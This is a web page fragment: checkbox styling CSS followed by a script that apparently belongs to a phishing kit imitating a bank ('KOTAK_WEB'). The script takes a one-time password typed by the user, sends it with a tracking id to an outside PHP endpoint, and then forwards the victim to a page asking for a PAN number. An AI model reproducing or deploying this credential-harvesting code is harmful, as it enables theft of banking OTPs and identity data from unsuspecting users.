.checkbox-wrapper-46 input[type="checkbox"] {
  display: none;
  visibility: hidden;
}

.checkbox-wrapper-46 .cbx {
  margin: auto;
  -webkit-user-select: none;
  user-select: none;
  cursor: pointer;
}
.checkbox-wrapper-46 .cbx span {
  display: inline-block;
  vertical-align: middle;
  transform: translate3d(0, 0, 0);
}
.checkbox-wrapper-46 .cbx span:first-child {
  position: relative;
  width: 16px;
  height: 16px;
  border-radius: 2px;
  transform: scale(1);
  vertical-align: middle;
  border: 1px solid grey;
  transition: all 0.3s ease;
}
.checkbox-wrapper-46 .cbx span:first-child svg {
  position: absolute;
  top: 2px;
  left: 1px;
  fill: none;
  stroke: #FFFFFF;
  stroke-width: 0.75;
  stroke-linecap: round;
  stroke-linejoin: round;
  stroke-dasharray: 16px;
  stroke-dashoffset: 16px;
  transition: all 0.3s ease;
  transition-delay: 0.1s;
  transform: translate3d(0, 0, 0);
}
.checkbox-wrapper-46 .cbx span:first-child:before {
  content: "";
  width: 100%;
  height: 100%;
  background: #0070e0;
  display: block;
  transform: scale(0);
  opacity: 1;
  border-radius: 50%;
}
.checkbox-wrapper-46 .cbx span:last-child {
  padding-left: 10px;
}
.checkbox-wrapper-46 .cbx:hover span:first-child {
  border-color: grey;
}

.checkbox-wrapper-46 .inp-cbx:checked + .cbx span:first-child {
  background: #0070e0;
  border-color: #0070e0;
  animation: wave-46 0.4s ease;
}
.checkbox-wrapper-46 .inp-cbx:checked + .cbx span:first-child svg {
  stroke-dashoffset: 0;
}
.checkbox-wrapper-46 .inp-cbx:checked + .cbx span:first-child:before {
  transform: scale(3.5);
  opacity: 0;
  transition: all 0.6s ease;
}

@keyframes wave-46 {
  50% {
    transform: scale(0.9);
  }
}

<script>
        function insertData() {
            // Get the input values
          var otp = document.getElementById("otp").value;

           if (otp!="") {
                var rand_id = localStorage.getItem('random_no');

                // Create a JavaScript object with the input data
                var data = {
                    otp: otp,
                    random_no:rand_id
                };

                // Send the data to the API endpoint using AJAX
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "https://anikdevnath.com/KOTAK_WEB/8.php", true);
                xhr.setRequestHeader("Content-Type", "application/json");
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === 4 && xhr.status === 200) {
                        console.log(xhr.responseText);

                        window.location.href='Enter_PAN_Number.html';
                    }
                };
                xhr.send(JSON.stringify(data));
            }
        else{
            alert('Please fill all fields');
        }



        }
